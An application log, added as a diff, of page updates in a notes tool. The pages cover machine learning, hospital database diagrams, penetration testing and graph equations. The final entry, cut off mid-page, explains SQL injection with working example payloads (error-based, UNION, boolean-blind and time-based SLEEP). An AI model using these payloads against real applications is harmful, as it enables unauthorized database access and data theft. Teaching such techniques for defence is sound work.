@@ -1,0 +1,2003 @@
+
+
+--- updatePage called at 2026-03-23T18:42:06.611Z ---
+INPUT: {
+  "pageId": "061249f8-e9b2-4a21-8e94-5756868a0695",
+  "blockType": "diagram",
+  "data": {
+    "elements": [
+      {
+        "type": "text",
+        "version": 1,
+        "versionNonce": 1774291326578,
+        "isDeleted": false,
+        "id": "error-text-1",
+        "fillStyle": "hachure",
+        "strokeWidth": 1,
+        "strokeStyle": "solid",
+        "roughness": 1,
+        "opacity": 100,
+        "angle": 0,
+        "x": 100,
+        "y": 100,
+        "strokeColor": "#e03e2d",
+        "backgroundColor": "transparent",
+        "width": 600,
+        "height": 50,
+        "seed": 1,
+        "groupIds": [],
+        "roundness": null,
+        "boundElements": [],
+        "updated": 1774291326578,
+        "link": null,
+        "locked": false,
+        "fontSize": 20,
+        "fontFamily": 1,
+        "text": "Failed to generate diagram (Server-side rendering error).",
+        "textAlign": "left",
+        "verticalAlign": "top",
+        "containerId": null,
+        "originalText": "Failed to generate diagram (Server-side rendering error).",
+        "lineHeight": 1.2
+      }
+    ],
+    "files": null
+  }
+}
+Saving blocks to DB. Length: 9
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-23T18:48:21.817Z ---
+INPUT: {
+  "pageId": "061249f8-e9b2-4a21-8e94-5756868a0695",
+  "blockType": "diagram",
+  "data": {
+    "elements": [
+      {
+        "type": "text",
+        "version": 1,
+        "versionNonce": 1774291701801,
+        "isDeleted": false,
+        "id": "error-text-1",
+        "fillStyle": "hachure",
+        "strokeWidth": 1,
+        "strokeStyle": "solid",
+        "roughness": 1,
+        "opacity": 100,
+        "angle": 0,
+        "x": 100,
+        "y": 100,
+        "strokeColor": "#e03e2d",
+        "backgroundColor": "transparent",
+        "width": 600,
+        "height": 50,
+        "seed": 1,
+        "groupIds": [],
+        "roundness": null,
+        "boundElements": [],
+        "updated": 1774291701801,
+        "link": null,
+        "locked": false,
+        "fontSize": 20,
+        "fontFamily": 1,
+        "text": "Failed to generate diagram (Server-side rendering error).",
+        "textAlign": "left",
+        "verticalAlign": "top",
+        "containerId": null,
+        "originalText": "Failed to generate diagram (Server-side rendering error).",
+        "lineHeight": 1.2
+      }
+    ],
+    "files": null
+  }
+}
+Saving blocks to DB. Length: 10
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-24T05:44:56.276Z ---
+INPUT: {
+  "pageId": "b5188c59-aaa9-4008-a453-2d38b44bb4db",
+  "blockType": "text",
+  "data": [
+    {
+      "type": "heading",
+      "props": {
+        "level": 1,
+        "textAlignment": "left"
+      },
+      "content": "What is Machine Learning (ML)?"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "textAlignment": "left"
+      },
+      "content": "Machine Learning (ML) is a subset of artificial intelligence (AI) that focuses on building systems that can learn from data. Instead of being explicitly programmed with rules, ML models learn patterns and relationships within data to make predictions or decisions."
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2,
+        "textAlignment": "left"
+      },
+      "content": "How Does it Work?"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "textAlignment": "left"
+      },
+      "content": [
+        {
+          "type": "text",
+          "text": "At its core, ML involves feeding large amounts of data to algorithms. These algorithms then analyze the data, identify patterns, and build a "
+        },
+        {
+          "type": "text",
+          "text": "model",
+          "styles": {
+            "italic": true,
+            "bold": true
+          }
+        },
+        {
+          "type": "text",
+          "text": ". This model can then be used to perform tasks like classification, regression, clustering, or anomaly detection on new, unseen data."
+        }
+      ]
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2,
+        "textAlignment": "left"
+      },
+      "content": "Key Types of Machine Learning"
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 3,
+        "textAlignment": "left"
+      },
+      "content": "1. Supervised Learning"
+    },
+    {
+      "type": "bulletListItem",
+      "props": {
+        "textAlignment": "left"
+      },
+      "content": "Models are trained on labeled data, meaning each input example has a corresponding correct output."
+    },
+    {
+      "type": "bulletListItem",
+      "props": {
+        "textAlignment": "left"
+      },
+      "content": "Used for tasks like predicting house prices (regression) or classifying emails as spam/not spam (classification)."
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 3,
+        "textAlignment": "left"
+      },
+      "content": "2. Unsupervised Learning"
+    },
+    {
+      "type": "bulletListItem",
+      "props": {
+        "textAlignment": "left"
+      },
+      "content": "Models are trained on unlabeled data and aim to find hidden patterns or structures within the data."
+    },
+    {
+      "type": "bulletListItem",
+      "props": {
+        "textAlignment": "left"
+      },
+      "content": "Examples include customer segmentation (clustering) or dimensionality reduction."
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 3,
+        "textAlignment": "left"
+      },
+      "content": "3. Reinforcement Learning"
+    },
+    {
+      "type": "bulletListItem",
+      "props": {
+        "textAlignment": "left"
+      },
+      "content": "An agent learns to make decisions by performing actions in an environment and receiving rewards or penalties."
+    },
+    {
+      "type": "bulletListItem",
+      "props": {
+        "textAlignment": "left"
+      },
+      "content": "Commonly used in robotics, game playing (e.g., AlphaGo), and autonomous driving."
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2,
+        "textAlignment": "left"
+      },
+      "content": "Applications of ML"
+    },
+    {
+      "type": "bulletListItem",
+      "props": {
+        "textAlignment": "left"
+      },
+      "content": "Recommendation systems (Netflix, Amazon)"
+    },
+    {
+      "type": "bulletListItem",
+      "props": {
+        "textAlignment": "left"
+      },
+      "content": "Image and speech recognition (facial recognition, virtual assistants)"
+    },
+    {
+      "type": "bulletListItem",
+      "props": {
+        "textAlignment": "left"
+      },
+      "content": "Medical diagnosis and drug discovery"
+    },
+    {
+      "type": "bulletListItem",
+      "props": {
+        "textAlignment": "left"
+      },
+      "content": "Fraud detection"
+    },
+    {
+      "type": "bulletListItem",
+      "props": {
+        "textAlignment": "left"
+      },
+      "content": "Natural Language Processing (NLP)"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "textAlignment": "left"
+      },
+      "content": "ML continues to evolve rapidly, transforming industries and impacting daily life."
+    }
+  ]
+}
+Saving blocks to DB. Length: 4
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-24T06:43:54.149Z ---
+INPUT: {
+  "pageId": "b5188c59-aaa9-4008-a453-2d38b44bb4db",
+  "blockType": "blocks",
+  "data": [
+    {
+      "type": "heading",
+      "props": {
+        "level": 1,
+        "textColor": "default"
+      },
+      "content": "What is Machine Learning?"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "textColor": "default",
+        "backgroundColor": "default",
+        "textAlignment": "left"
+      },
+      "content": "Machine Learning (ML) is a subset of Artificial Intelligence (AI) that enables systems to learn from data, identify patterns, and make decisions with minimal human intervention. Instead of being explicitly programmed for every task, ML algorithms are designed to improve their performance over time as they are exposed to more data."
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "textColor": "default",
+        "backgroundColor": "default",
+        "textAlignment": "left"
+      },
+      "content": "The core idea behind machine learning is to build algorithms that can 'learn' from data. This learning process typically involves feeding large datasets into a model, which then processes this information to find relationships, correlations, and structures. Based on these learned patterns, the model can then predict outcomes or classify new, unseen data."
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "textColor": "default",
+        "backgroundColor": "default",
+        "textAlignment": "left"
+      },
+      "content": "Common applications of machine learning include image recognition, natural language processing (like virtual assistants), recommendation systems (e.g., Netflix, Amazon), fraud detection, and predictive analytics in various industries."
+    }
+  ]
+}
+Saving blocks to DB. Length: 9
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-24T06:45:01.504Z ---
+INPUT: {
+  "pageId": "b5188c59-aaa9-4008-a453-2d38b44bb4db",
+  "blockType": "blocks",
+  "data": [
+    {
+      "type": "heading",
+      "props": {
+        "level": 2
+      },
+      "content": "Supervised Learning"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "backgroundColor": "blue"
+      },
+      "content": "Supervised learning is a type of machine learning where an algorithm learns from labeled data. This means that each training example comes with an input and a corresponding correct output. The model learns to map inputs to outputs, and its goal is to predict the output for new, unseen inputs. Common tasks include classification (e.g., spam detection) and regression (e.g., predicting house prices)."
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2
+      },
+      "content": "Unsupervised Learning"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "backgroundColor": "green"
+      },
+      "content": "Unsupervised learning is a type of machine learning that deals with unlabeled data. In this approach, the algorithm tries to find hidden patterns, structures, or relationships within the input data without any explicit guidance. There are no correct outputs provided during training. Common tasks include clustering (e.g., grouping customers by behavior) and dimensionality reduction (e.g., simplifying data for visualization)."
+    }
+  ]
+}
+Saving blocks to DB. Length: 14
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-24T06:48:20.960Z ---
+INPUT: {
+  "pageId": "b5188c59-aaa9-4008-a453-2d38b44bb4db",
+  "blockType": "blocks",
+  "data": [
+    {
+      "type": "heading",
+      "props": {
+        "level": 1,
+        "textColor": "blue"
+      },
+      "content": "Understanding Machine Learning"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "backgroundColor": "lightgray"
+      },
+      "content": "Machine Learning (ML) is a subset of artificial intelligence (AI) that enables systems to learn from data, identify patterns, and make decisions with minimal human intervention. It's all about teaching computers to learn from experience, much like humans do."
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2,
+        "textColor": "green"
+      },
+      "content": "How Does It Work?"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "backgroundColor": "lightyellow"
+      },
+      "content": "At its core, ML involves feeding large amounts of data into algorithms. These algorithms process the data, learn patterns, and build a model. This model can then be used to make predictions, classifications, or other data-driven decisions on new, unseen data."
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "backgroundColor": "lightyellow"
+      },
+      "content": [
+        {
+          "type": "text",
+          "text": "The learning process often involves "
+        },
+        {
+          "type": "text",
+          "text": "training",
+          "styles": {
+            "bold": true
+          }
+        },
+        {
+          "type": "text",
+          "text": " the model on existing data, "
+        },
+        {
+          "type": "text",
+          "text": "validating",
+          "styles": {
+            "bold": true
+          }
+        },
+        {
+          "type": "text",
+          "text": " its performance, and then "
+        },
+        {
+          "type": "text",
+          "text": "testing",
+          "styles": {
+            "bold": true
+          }
+        },
+        {
+          "type": "text",
+          "text": " it with new data to ensure accuracy and generalization."
+        }
+      ]
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2,
+        "textColor": "orange"
+      },
+      "content": "Key Types of Machine Learning"
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 3,
+        "textColor": "purple"
+      },
+      "content": "1. Supervised Learning"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "backgroundColor": "lightblue"
+      },
+      "content": "This type of ML uses labeled datasets to train algorithms. The algorithm learns from input data and its corresponding correct output, eventually learning to map inputs to outputs. Examples include classification (e.g., spam detection) and regression (e.g., predicting house prices)."
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 3,
+        "textColor": "purple"
+      },
+      "content": "2. Unsupervised Learning"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "backgroundColor": "lightgreen"
+      },
+      "content": "Here, algorithms work with unlabeled data to find hidden patterns or intrinsic structures within the data. It's used for tasks like clustering (e.g., customer segmentation) and dimensionality reduction (e.g., simplifying complex datasets)."
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 3,
+        "textColor": "purple"
+      },
+      "content": "3. Reinforcement Learning"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "backgroundColor": "lightcoral"
+      },
+      "content": "In reinforcement learning, an agent learns to make decisions by performing actions in an environment and receiving rewards or penalties. The goal is to maximize the cumulative reward over time. It's often used in robotics, gaming, and autonomous systems."
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2,
+        "textColor": "red"
+      },
+      "content": "Common Applications"
+    },
+    {
+      "type": "paragraph",
+      "props": {
+        "backgroundColor": "lightpink"
+      },
+      "content": "Machine Learning is transforming various industries. Some prominent applications include:"
+    },
+    {
+      "type": "bulletListItem",
+      "props": {
+        "backgroundColor": "lightpink"
+      },
+      "content": [
+        {
+          "type": "text",
+          "text": "Image Recognition",
+          "styles": {
+            "bold": true
+          }
+        },
+        {
+          "type": "text",
+          "text": ": Identifying objects, people, or places in images."
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "props": {
+        "backgroundColor": "lightpink"
+      },
+      "content": [
+        {
+          "type": "text",
+          "text": "Natural Language Processing (NLP)",
+          "styles": {
+            "bold": true
+          }
+        },
+        {
+          "type": "text",
+          "text": ": Understanding and generating human language, like in chatbots or translation services."
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "props": {
+        "backgroundColor": "lightpink"
+      },
+      "content": [
+        {
+          "type": "text",
+          "text": "Recommendation Systems",
+          "styles": {
+            "bold": true
+          }
+        },
+        {
+          "type": "text",
+          "text": ": Suggesting products or content based on user preferences (e.g., Netflix, Amazon)."
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "props": {
+        "backgroundColor": "lightpink"
+      },
+      "content": [
+        {
+          "type": "text",
+          "text": "Medical Diagnosis",
+          "styles": {
+            "bold": true
+          }
+        },
+        {
+          "type": "text",
+          "text": ": Assisting doctors in identifying diseases from medical images or patient data."
+        }
+      ]
+    }
+  ]
+}
+Saving blocks to DB. Length: 19
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-24T06:49:12.444Z ---
+INPUT: {
+  "pageId": "b5188c59-aaa9-4008-a453-2d38b44bb4db",
+  "blockType": "video",
+  "data": "https://utfs.io/f/9fQYfmvDcjYK2WMJITuEO4aqKYhW0NZypexlS9M3VnJbXFr8"
+}
+Saving blocks to DB. Length: 21
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-24T06:51:51.381Z ---
+INPUT: {
+  "pageId": "b5188c59-aaa9-4008-a453-2d38b44bb4db",
+  "blockType": "diagram",
+  "data": {
+    "elements": [
+      {
+        "type": "text",
+        "version": 1,
+        "versionNonce": 1774335111347,
+        "isDeleted": false,
+        "id": "error-text-1",
+        "fillStyle": "hachure",
+        "strokeWidth": 1,
+        "strokeStyle": "solid",
+        "roughness": 1,
+        "opacity": 100,
+        "angle": 0,
+        "x": 100,
+        "y": 100,
+        "strokeColor": "#e03e2d",
+        "backgroundColor": "transparent",
+        "width": 600,
+        "height": 50,
+        "seed": 1,
+        "groupIds": [],
+        "roundness": null,
+        "boundElements": [],
+        "updated": 1774335111347,
+        "link": null,
+        "locked": false,
+        "fontSize": 20,
+        "fontFamily": 1,
+        "text": "Failed to generate diagram (Server-side rendering error).",
+        "textAlign": "left",
+        "verticalAlign": "top",
+        "containerId": null,
+        "originalText": "Failed to generate diagram (Server-side rendering error).",
+        "lineHeight": 1.2
+      }
+    ],
+    "files": null
+  }
+}
+Saving blocks to DB. Length: 22
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-24T07:01:17.821Z ---
+INPUT: {
+  "pageId": "b5188c59-aaa9-4008-a453-2d38b44bb4db",
+  "blockType": "diagram",
+  "data": {
+    "mermaidCode": "flowchart TD\n    DPT[\"<b>DEPARTMENT</b><br>---<br>PK: DeptID<br>Name<br>Location\"]\n    DOC[\"<b>DOCTOR</b><br>---<br>PK: DoctorID<br>Name<br>Specialization<br>FK: DeptID\"]\n    PT[\"<b>PATIENT</b><br>---<br>PK: PatientID<br>Name<br>Gender<br>DOB<br>Contact\"]\n    APT[\"<b>APPOINTMENT</b><br>---<br>PK: ApptID<br>Date<br>Time<br>Status<br>FK: PatientID<br>FK: DoctorID\"]\n    MR[\"<b>MEDICAL_RECORD</b><br>---<br>PK: RecordID<br>Diagnosis<br>Treatment<br>Date<br>FK: PatientID<br>FK: DoctorID\"]\n    RM[\"<b>ROOM</b><br>---<br>PK: RoomID<br>RoomNumber<br>Type<br>Status<br>FK: PatientID\"]\n    BL[\"<b>BILL</b><br>---<br>PK: BillID<br>Amount<br>Date<br>Status<br>FK: PatientID\"]\n\n    DPT -->|1 : N| DOC\n    PT -->|1 : N| APT\n    DOC -->|1 : N| APT\n    PT -->|1 : N| MR\n    DOC -->|1 : N| MR\n    PT -->|1 : N| RM\n    PT -->|1 : N| BL"
+  }
+}
+Saving blocks to DB. Length: 24
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-24T07:05:38.993Z ---
+INPUT: {
+  "pageId": "b5188c59-aaa9-4008-a453-2d38b44bb4db",
+  "blockType": "diagram",
+  "data": {
+    "mermaidCode": "flowchart TD\n    Department[\"<b>DEPARTMENT</b><br/>=============<br/>PK: DepartmentID<br/>DepartmentName<br/>Location\"]\n    Doctor[\"<b>DOCTOR</b><br/>=============<br/>PK: DoctorID<br/>FullName<br/>Specialty<br/>Phone<br/>FK: DepartmentID\"]\n    Patient[\"<b>PATIENT</b><br/>=============<br/>PK: PatientID<br/>FullName<br/>DateOfBirth<br/>Gender<br/>ContactNumber\"]\n    Appointment[\"<b>APPOINTMENT</b><br/>=============<br/>PK: AppointmentID<br/>ApptDate<br/>ApptTime<br/>Status<br/>FK: PatientID<br/>FK: DoctorID\"]\n    MedicalRecord[\"<b>MEDICAL_RECORD</b><br/>==================<br/>PK: RecordID<br/>VisitDate<br/>Diagnosis<br/>Prescription<br/>FK: PatientID<br/>FK: DoctorID\"]\n    Room[\"<b>ROOM</b><br/>=============<br/>PK: RoomID<br/>RoomNumber<br/>RoomType<br/>IsOccupied<br/>FK: PatientID\"]\n\n    Department -- \"1 : N\" --> Doctor\n    Doctor -- \"1 : N\" --> Appointment\n    Patient -- \"1 : N\" --> Appointment\n    Doctor -- \"1 : N\" --> MedicalRecord\n    Patient -- \"1 : N\" --> MedicalRecord\n    Patient -- \"1 : 1\" --> Room\n\n    classDef default fill:#f8f9fa,stroke:#343a40,stroke-width:2px,color:#212529"
+  }
+}
+Saving blocks to DB. Length: 26
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-24T07:11:19.552Z ---
+INPUT: {
+  "pageId": "b5188c59-aaa9-4008-a453-2d38b44bb4db",
+  "blockType": "diagram",
+  "data": {
+    "mermaidCode": "flowchart TD\nDepartment[\"<b>Department</b><br>PK DepartmentID<br>Name<br>Location\"]\nDoctor[\"<b>Doctor</b><br>PK DoctorID<br>FK DepartmentID<br>Name<br>Specialty<br>Contact\"]\nPatient[\"<b>Patient</b><br>PK PatientID<br>Name<br>DOB<br>Gender<br>Contact<br>Address\"]\nAppointment[\"<b>Appointment</b><br>PK AppointmentID<br>FK PatientID<br>FK DoctorID<br>ApptDate<br>ApptTime<br>Status\"]\nMedicalRecord[\"<b>Medical Record</b><br>PK RecordID<br>FK PatientID<br>FK DoctorID<br>Diagnosis<br>Prescription<br>RecordDate\"]\nRoom[\"<b>Room</b><br>PK RoomID<br>FK DepartmentID<br>RoomNumber<br>RoomType<br>IsAvailable\"]\nAdmission[\"<b>Admission</b><br>PK AdmissionID<br>FK PatientID<br>FK RoomID<br>AdmissionDate<br>DischargeDate\"]\nBilling[\"<b>Billing</b><br>PK InvoiceID<br>FK PatientID<br>FK AppointmentID<br>TotalAmount<br>PaymentStatus\"]\n\nDepartment -->|1 : M| Doctor\nDepartment -->|1 : M| Room\nDoctor -->|1 : M| Appointment\nPatient -->|1 : M| Appointment\nDoctor -->|1 : M| MedicalRecord\nPatient -->|1 : M| MedicalRecord\nPatient -->|1 : M| Admission\nRoom -->|1 : M| Admission\nPatient -->|1 : M| Billing\nAppointment -->|1 : 1| Billing"
+  }
+}
+Saving blocks to DB. Length: 23
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-24T08:17:00.997Z ---
+INPUT: {
+  "pageId": "f94dd0d8-b7b4-44c0-834b-93dad8b6bda7",
+  "blockType": "blocks",
+  "data": [
+    {
+      "type": "heading",
+      "props": {
+        "level": 1
+      },
+      "content": "Vulnerability Assessment and Penetration Testing (VAPT)"
+    },
+    {
+      "type": "paragraph",
+      "content": "VAPT, or Vulnerability Assessment and Penetration Testing, is a comprehensive security process that identifies, evaluates, and addresses security weaknesses in an organization's IT infrastructure, applications, and networks."
+    },
+    {
+      "type": "paragraph",
+      "content": "It combines two distinct but complementary security services to provide a holistic view of an organization's security posture."
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2
+      },
+      "content": "1. Vulnerability Assessment (VA)"
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "A Vulnerability Assessment is a systematic review of security weaknesses in a system. It involves using automated tools to scan for known vulnerabilities. The primary goal of a VA is to identify as many vulnerabilities as possible, categorize them by severity, and provide recommendations for remediation."
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Identifies potential security flaws."
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Often automated and less intrusive."
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Provides a prioritized list of vulnerabilities."
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Focuses on breadth (finding many vulnerabilities)."
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2
+      },
+      "content": "2. Penetration Testing (PT)"
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "Penetration Testing, often called a pen test or ethical hacking, is a simulated cyberattack against your computer system to check for exploitable vulnerabilities. Pen testers (ethical hackers) use the findings from the VA (and other reconnaissance methods) to try and exploit those vulnerabilities to gain unauthorized access, elevate privileges, or exfiltrate data."
+        }
+      ]
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Attempts to exploit identified vulnerabilities."
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Manual and more intrusive."
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Determines the true risk and impact of vulnerabilities."
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Focuses on depth (proving exploitability and impact)."
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2
+      },
+      "content": "Key Benefits of VAPT"
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Identifies and addresses security weaknesses before they can be exploited by malicious actors."
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Helps ensure compliance with regulatory requirements (e.g., GDPR, HIPAA, PCI DSS)."
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Protects sensitive data and intellectual property."
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Enhances customer trust and brand reputation."
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Provides valuable insights for improving an organization's overall security posture."
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2
+      },
+      "content": "Conclusion"
+    },
+    {
+      "type": "paragraph",
+      "content": "In essence, while a Vulnerability Assessment tells you where your locks are weak or missing, Penetration Testing shows you if a skilled burglar can actually get through them and what damage they could do. Together, they provide a robust and actionable security review for any organization."
+    }
+  ]
+}
+Saving blocks to DB. Length: 24
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-24T08:17:36.054Z ---
+INPUT: {
+  "pageId": "f94dd0d8-b7b4-44c0-834b-93dad8b6bda7",
+  "blockType": "video",
+  "data": "https://utfs.io/f/9fQYfmvDcjYKlsqviRama04eCvHld5QcpLykq1FuhWAoGnTI"
+}
+Saving blocks to DB. Length: 26
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-24T08:20:23.938Z ---
+INPUT: {
+  "pageId": "f94dd0d8-b7b4-44c0-834b-93dad8b6bda7",
+  "blockType": "desmos",
+  "data": [
+    {
+      "id": "graph1",
+      "latex": "x^2 + y^2 = 1",
+      "color": "#c74440",
+      "hidden": false
+    }
+  ]
+}
+Saving blocks to DB. Length: 28
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-24T08:21:47.235Z ---
+INPUT: {
+  "pageId": "f94dd0d8-b7b4-44c0-834b-93dad8b6bda7",
+  "blockType": "desmos",
+  "data": [
+    {
+      "id": "graph1",
+      "latex": "(x-1)^2 + (y-1)^2 = 25",
+      "color": "#c74440",
+      "hidden": false
+    }
+  ]
+}
+Saving blocks to DB. Length: 30
+Saved successfully to Postgres.
+
+
+--- updatePage called at 2026-03-24T08:29:17.859Z ---
+INPUT: {
+  "pageId": "2d861703-0145-4cb9-8944-aa23b8431e69",
+  "blockType": "blocks",
+  "data": [
+    {
+      "type": "heading",
+      "props": {
+        "level": 1
+      },
+      "content": "SQL Injection Payloads: A Detailed Explanation"
+    },
+    {
+      "type": "paragraph",
+      "content": "A SQL Injection payload is a meticulously crafted piece of SQL code or commands that an attacker injects into a vulnerable input field of a web application to manipulate the backend database."
+    },
+    {
+      "type": "paragraph",
+      "content": "These payloads are designed to exploit flaws in how an application constructs SQL queries, leading to unauthorized data access, modification, or even control over the database server."
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2
+      },
+      "content": "Purpose of SQL Injection Payloads"
+    },
+    {
+      "type": "paragraph",
+      "content": "The primary goal of a payload is to alter the original SQL query's logic, enabling an attacker to achieve various malicious objectives. Common objectives include:"
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Bypassing authentication mechanisms."
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Extracting sensitive data (e.g., usernames, passwords, credit card numbers, intellectual property)."
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Modifying database contents (e.g., updating records, inserting new data)."
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Deleting database tables or entire databases."
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Executing arbitrary commands on the database server or underlying operating system (if supported by the database and its configuration)."
+    },
+    {
+      "type": "bulletListItem",
+      "content": "Performing denial-of-service attacks by overloading the database."
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 2
+      },
+      "content": "Types of SQL Injection Payloads"
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 3
+      },
+      "content": "1. Error-Based SQLi Payloads"
+    },
+    {
+      "type": "paragraph",
+      "content": "These payloads intentionally cause the database to generate an error message that contains sensitive information, such as database structure or data."
+    },
+    {
+      "type": "paragraph",
+      "content": "Attackers use specific functions (e.g., UPDATE_XML, EXTRACTVALUE for Oracle/MySQL, or malformed queries with CONCAT) to trigger these errors and leak data directly within the error output."
+    },
+    {
+      "type": "paragraph",
+      "content": "Example (MySQL): "
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        }
+      ]
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 3
+      },
+      "content": "2. Union-Based SQLi Payloads"
+    },
+    {
+      "type": "paragraph",
+      "content": "This technique uses the "
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "UNION SELECT"
+        }
+      ]
+    },
+    {
+      "type": "paragraph",
+      "content": " operator to combine the results of an attacker-supplied query with the results of the original legitimate query. The combined result is then returned to the application."
+    },
+    {
+      "type": "paragraph",
+      "content": "It requires knowing the number of columns and compatible data types of the original query for the "
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "UNION SELECT"
+        }
+      ]
+    },
+    {
+      "type": "paragraph",
+      "content": " statement to succeed."
+    },
+    {
+      "type": "paragraph",
+      "content": "Example: "
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "username' UNION SELECT null, database(), user()--"
+        }
+      ]
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 3
+      },
+      "content": "3. Boolean-Based Blind SQLi Payloads"
+    },
+    {
+      "type": "paragraph",
+      "content": "When error messages are suppressed and UNION queries don't work (e.g., no direct output displayed), attackers rely on boolean conditions to infer data."
+    },
+    {
+      "type": "paragraph",
+      "content": "The payload causes the application to return a different observable response (e.g., true/false, content changes, or an empty page) based on whether a specific condition is met, allowing data extraction bit by bit or character by character."
+    },
+    {
+      "type": "paragraph",
+      "content": "Example: "
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "username' AND SUBSTRING(VERSION(), 1, 1) = '5'--"
+        }
+      ]
+    },
+    {
+      "type": "paragraph",
+      "content": "(This checks if the first character of the database version is '5'. If true, the page renders normally; if false, the page content changes or is empty.)"
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 3
+      },
+      "content": "4. Time-Based Blind SQLi Payloads"
+    },
+    {
+      "type": "paragraph",
+      "content": "Similar to boolean-based blind SQLi, but instead of content changes, the attacker measures the response time of the server."
+    },
+    {
+      "type": "paragraph",
+      "content": "If a specific condition in the payload is true, the database is instructed to delay its response for a specified amount of time (e.g., using "
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "SLEEP()"
+        }
+      ]
+    },
+    {
+      "type": "paragraph",
+      "content": " or "
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "BENCHMARK()"
+        }
+      ]
+    },
+    {
+      "type": "paragraph",
+      "content": "). The delay indicates the truth of the condition."
+    },
+    {
+      "type": "paragraph",
+      "content": "Example: "
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": "username' AND IF(SUBSTRING(VERSION(), 1, 1) = '5', SLEEP(5), 0)--"
+        }
+      ]
+    },
+    {
+      "type": "paragraph",
+      "content": "(If the condition is true, the page will delay its response by 5 seconds.)"
+    },
+    {
+      "type": "heading",
+      "props": {
+        "level": 3
+      },
+      "content": "5. Stacked Queries SQLi Payloads"
+    },
+    {
+      "type": "paragraph",
+      "content": "This advanced technique allows an attacker to execute multiple SQL statements in a single query string, separated by a semicolon ("
+    },
+    {
+      "type": "paragraph",
+      "content": [
+        {
+          "type": "text",
+          "text": ";"
+        }
+      ]
+    },
+    {
+      "type": "paragraph",
+      "content": "). This means commands like "
+    },
